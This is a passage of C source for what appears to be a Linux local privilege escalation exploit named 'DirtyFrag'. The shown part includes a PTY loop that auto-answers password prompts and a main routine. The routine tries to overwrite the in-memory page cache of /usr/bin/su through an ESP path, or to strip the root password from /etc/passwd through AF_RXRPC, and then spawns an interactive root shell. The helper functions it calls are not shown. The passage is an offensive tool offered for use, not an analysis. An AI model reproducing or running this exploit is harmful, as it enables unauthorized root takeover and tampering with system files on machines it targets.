            _exit(127);
        ioctl(slave, TIOCSCTTY, 0);
        dup2(slave, 0);
        dup2(slave, 1);
        dup2(slave, 2);
        if (slave > 2)
            close(slave);
        close(master);
        exec_custom_binary(target_path);
        _exit(127);
    }

    signal(SIGTTOU, SIG_IGN);
    signal(SIGTTIN, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP,  SIG_IGN);
    (void)setpgid(0, 0);
    (void)tcsetpgrp(STDIN_FILENO, getpid());

    struct termios saved_termios;
    int restore_termios = 0;
    if (tcgetattr(STDIN_FILENO, &saved_termios) == 0) {
        struct termios raw = saved_termios;
        cfmakeraw(&raw);
        if (tcsetattr(STDIN_FILENO, TCSANOW, &raw) == 0)
            restore_termios = 1;
    }

    int auto_pw_sent = 0;
    int stdin_eof = 0;
    int saw_master_output = 0;
    int total_ms = 0;
    char buf[4096];

    for (;;) {
        struct pollfd pfds[2] = {
            { stdin_eof ? -1 : STDIN_FILENO, POLLIN, 0 },
            { master,                        POLLIN, 0 },
        };
        int pr = poll(pfds, 2, 200);
        if (pr < 0 && errno != EINTR)
            break;
        total_ms += 200;

        if (pfds[1].revents & POLLIN) {
            ssize_t n = read(master, buf, sizeof(buf));
            if (n <= 0)
                break;
            saw_master_output = 1;
            (void)write(STDOUT_FILENO, buf, n);
            if (!auto_pw_sent && n < (ssize_t)sizeof(buf)) {
                buf[n] = 0;
                if (strstr(buf, "Password") || strstr(buf, "password")) {
                    (void)write(master, "\n", 1);
                    auto_pw_sent = 1;
                }
            }
        }
        if (!stdin_eof && (pfds[0].revents & POLLIN)) {
            ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
            if (n <= 0)
                stdin_eof = 1;
            else
                (void)write(master, buf, n);
        }
        if (pfds[1].revents & (POLLHUP | POLLERR))
            break;

        if (!auto_pw_sent && !saw_master_output && total_ms >= 1500) {
            (void)write(master, "\n", 1);
            auto_pw_sent = 1;
        }

        int status;
        pid_t w = waitpid(pid, &status, WNOHANG);
        if (w == pid) {
            for (int i = 0; i < 5; i++) {
                struct pollfd pf = { master, POLLIN, 0 };
                if (poll(&pf, 1, 50) <= 0)
                    break;
                ssize_t n = read(master, buf, sizeof(buf));
                if (n <= 0)
                    break;
                (void)write(STDOUT_FILENO, buf, n);
            }
            break;
        }
    }

    if (restore_termios)
        tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios);
    close(master);
    return 0;
}

/* Main function */
int main(int argc, char **argv)
{
    const char *su_target = "/usr/bin/su";
    const char *passwd_target = "/etc/passwd";
    int force_esp = 0, force_rxrpc = 0;
    int verbose = (getenv("DIRTYFRAG_VERBOSE") != NULL);
    int saved_err = -1;
    int rc = 1;
    int new_argc;
    char **co_argv;
    
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--force-esp"))
            force_esp = 1;
        else if (!strcmp(argv[i], "--force-rxrpc"))
            force_rxrpc = 1;
        else if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
            verbose = 1;
        else if (argv[i][0] != '-') {
            su_target = argv[i];
        }
    }
    
    const char *env_target = getenv("DIRTYFRAG_TARGET");
    if (env_target && *env_target)
        su_target = env_target;

    if (getuid() == 0) {
        printf("[!] Already running as root!\n");
        execlp("/bin/bash", "bash", (char *)NULL);
        _exit(1);
    }

    co_argv = append_corrupt_only(argc, argv, &new_argc);

    if (!verbose)
        silence_stderr(&saved_err);

    printf("\n========================================\n");
    printf(" DirtyFrag LPE - Custom SUID Binary Exploit\n");
    printf("========================================\n");
    printf("[*] Starting Local Privilege Escalation chain...\n");
    printf("[*] Target SUID binary: %s\n", su_target);
    printf("[*] Fallback target: %s\n", passwd_target);

    if (force_rxrpc) {
        printf("[*] Background: Forced AF_RXRPC path. Attempting to overwrite %s...\n", passwd_target);
        rc = rxrpc_lpe_main(new_argc, co_argv, passwd_target);
        for (int i = 0; !passwd_already_patched_cached(passwd_target) && i < 3; i++)
            rc = rxrpc_lpe_main(new_argc, co_argv, passwd_target);
    } else if (force_esp) {
        printf("[*] Background: Forced ESP path. Attempting to hijack %s page-cache...\n", su_target);
        rc = su_lpe_main(new_argc, co_argv, su_target);
    } else {
        printf("[*] Background Stage 1: Attempting ESP path to hijack %s in memory...\n", su_target);
        rc = su_lpe_main(new_argc, co_argv, su_target);
        if (!binary_already_patched_cached(su_target)) {
            printf("[-] Background: ESP path failed or blocked.\n");
            printf("[*] Background Stage 2: Falling back to AF_RXRPC to remove root password from %s...\n", passwd_target);
            rc = rxrpc_lpe_main(new_argc, co_argv, passwd_target);
            for (int i = 0; !passwd_already_patched_cached(passwd_target) && i < 3; i++)
                rc = rxrpc_lpe_main(new_argc, co_argv, passwd_target);
        }
    }

    int patched = either_target_patched(su_target, passwd_target);

    if (!verbose)
        restore_stderr(saved_err);

    if (patched) {
        printf("[+] Background: Success! Target system file was successfully patched.\n");
        if (binary_already_patched_cached(su_target)) {
            printf("[+] %s was patched successfully.\n", su_target);
            printf("[+] Background Stage 3: Spawning interactive root shell via %s...\n\n", su_target);
            (void)run_root_pty_with_target(su_target);
        } else if (passwd_already_patched_cached(passwd_target)) {
            printf("[+] %s was patched successfully.\n", passwd_target);
            printf("[+] Background Stage 3: Spawning interactive root shell via su (with empty password)...\n\n");
            (void)run_root_pty_with_target("/usr/bin/su");
        }
        return 0;
    }

    printf("[-] Background: Exploit chain failed. Could not patch targets.\n");
    dprintf(2, "dirtyfrag: failed (rc=%d)\n", rc);
    return rc ? rc : 1;
}
